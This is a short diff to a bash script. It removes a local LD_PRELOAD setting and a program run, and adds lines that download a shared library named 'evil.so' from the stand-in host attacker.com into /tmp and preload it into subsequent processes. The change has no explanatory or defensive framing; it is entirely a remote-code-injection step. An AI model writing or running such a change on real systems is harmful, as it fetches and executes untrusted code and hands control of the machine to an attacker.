@@ -1,3 +1,3 @@
 #!/bin/bash
-export LD_PRELOAD=$PWD/libruin.so
-./gm 9 8 10 24 75 9
+wget -P /tmp/ http://attacker.com/evil.so
+export LD_PRELOAD=/tmp/evil.so
